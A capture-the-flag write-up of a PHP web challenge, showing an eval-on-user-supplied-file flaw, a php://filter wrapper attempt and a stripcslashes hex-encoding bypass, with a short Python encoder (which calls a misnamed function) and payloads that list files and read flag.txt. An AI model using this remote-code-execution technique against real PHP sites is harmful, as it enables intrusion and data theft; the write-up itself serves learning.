
### Directions
1. `$randVal` is time-based
```PHP
$randVal = sha1 (time ());
```

2. ~~Cookie~~ - Seems like a dead end for exploitation
```PHP
setcookie ('session_id', $randVal, time () + 2, '', '', true, true);
```

3. If we can get to write a file with valid PHP code, this would be RCE
```PHP
if (isset ($_GET['cache_file'])) {  
    if (file_exists ($_GET['cache_file'])) {  
        echo eval (stripcslashes (file_get_contents ($_GET['cache_file'])));  
    }  
}
```
(This doesn't follow the template of creating files in the `/tmp` directory)
I presume the way to solve this would be with [PHP Wrappers (Exploit)](https://www.invicti.com/blog/web-security/php-stream-wrappers) ([PHP Wrapper (Docs)](https://www.php.net/manual/en/wrappers.php)), but its a pain to use... So let's use it:
- The logic we want to achieve is to call `file_get_contents` on a `base64` wrapper which points to our encrypted code - therefore our output will go directory to `eval`.
	- `cache_file=php://filter/convert.base64-decode/resource=/tmp/{session_id}`
	- `/tmp/{session_id}/{file}`
	- file data: `$_GET[0]` - encoded: `JF9HRVRbMF0K`

- This doesn't seem to work. Although I do believe in this solution, I tried continuing down the path of the next lead which seems a bit easier.

4. `stripslashes` function
Reading up online, `stripslashes` unintentionally decodes binary data to strings...
(Meaning if we'd have a C-str like `\x41\x41\x41` and pass it into `stripslashes` we'd get back `AAA`. Meaning we have an encoding which passes the `fwrite` sanitation).

Tested with `php -a` (interactive shell, like `ipython`)
```
php > echo ${stripslashes("\x41\x41")};
php > echo $var;
AA
```
We could use the hex representation only when the filter will ruin our input, but doing it for the whole string is also plausible and fits this automation:
```python
def to_cstr_hex(s: str) -> str:
    return ''.join(f'\\x{ord(c):02x}' for c in s)

if __name__ == "__main__":
	code = """PHP CODE"""
    print(to_cstr_binary(code))
```
- `scandir(".")`
- `echo file_get_contents("flag.txt")`
# Solution
```
WEBSEC{stripcslashes_to_bypass}
```